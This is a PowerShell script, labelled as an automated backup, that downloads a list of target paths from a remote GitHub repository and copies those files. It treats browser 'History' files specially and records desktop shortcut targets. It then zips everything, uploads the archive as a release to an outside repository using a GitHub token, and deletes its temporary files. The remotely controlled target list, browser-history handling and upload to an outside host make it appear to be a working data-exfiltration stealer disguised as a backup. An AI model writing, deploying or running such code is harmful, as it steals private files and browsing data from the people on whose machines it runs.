# Set UTF-8 encoding
chcp 65001 > $null
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

"[UPLOAD START] $(Get-Date -Format u)" | Out-File "C:\runtime_log.txt" -Append

$token = $env:GITHUB_TOKEN
if (-not $token) {
    "❌ 没有设置 GITHUB_TOKEN 环境变量，终止。" | Out-File "C:\runtime_log.txt" -Append
    exit
}

$repo = "drftghy/backup-files"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# STEP 1: Load path list
$remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
try {
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
    "✅ 远程路径加载成功，共 $($pathList.Count) 条。" | Out-File "C:\runtime_log.txt" -Append
} catch {
    "❌ 无法加载路径列表：$($_.Exception.Message)" | Out-File "C:\runtime_log.txt" -Append
    exit
}

$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"

    if (-not (Test-Path $path)) {
        "⚠️ 跳过不存在路径：$path" | Out-File "C:\runtime_log.txt" -Append
        continue
    }

    $dest = Join-Path $tempRoot $name
    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
        "✅ 拷贝完成：$path" | Out-File "C:\runtime_log.txt" -Append
    } catch {
        "❌ 拷贝失败：$path" | Out-File "C:\runtime_log.txt" -Append
    }
}

# STEP 2: 桌面快捷方式
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""
    foreach ($lnk in $lnkFiles) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $lnkReport += "[$($lnk.Name)]`n"
        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
        $lnkReport += "Icon:       $($shortcut.IconLocation)`n-----------`n"
    }
    $lnkReport | Out-File -FilePath "$tempRoot\lnk_info.txt" -Encoding utf8
    "✅ 快捷方式信息已提取。" | Out-File "C:\runtime_log.txt" -Append
} catch {
    "⚠️ 快捷方式提取失败" | Out-File "C:\runtime_log.txt" -Append
}

# STEP 3: 压缩
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force
    "✅ 压缩完成：$zipPath" | Out-File "C:\runtime_log.txt" -Append
} catch {
    "❌ 压缩失败" | Out-File "C:\runtime_log.txt" -Append
    exit
}

# STEP 4: 上传 Release
$releaseData = @{
    tag_name = $tag
    name     = $releaseName
    body     = "Automated backup from $computerName on $date"
    draft    = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellScript"
    Accept = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
    "✅ 创建 Release 成功。" | Out-File "C:\runtime_log.txt" -Append
} catch {
    "❌ 创建 Release 失败：$($_.Exception.Message)" | Out-File "C:\runtime_log.txt" -Append
    exit
}

try {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellScript"
    }
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
    "✅ 上传成功。" | Out-File "C:\runtime_log.txt" -Append
} catch {
    "❌ 上传失败：$($_.Exception.Message)" | Out-File "C:\runtime_log.txt" -Append
}

# STEP 5: 清理
try {
    Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    "🧹 临时文件清理完成。" | Out-File "C:\runtime_log.txt" -Append
} catch {
    "⚠️ 清理失败。" | Out-File "C:\runtime_log.txt" -Append
}

"[UPLOAD END] $(Get-Date -Format u)`n" | Out-File "C:\runtime_log.txt" -Append
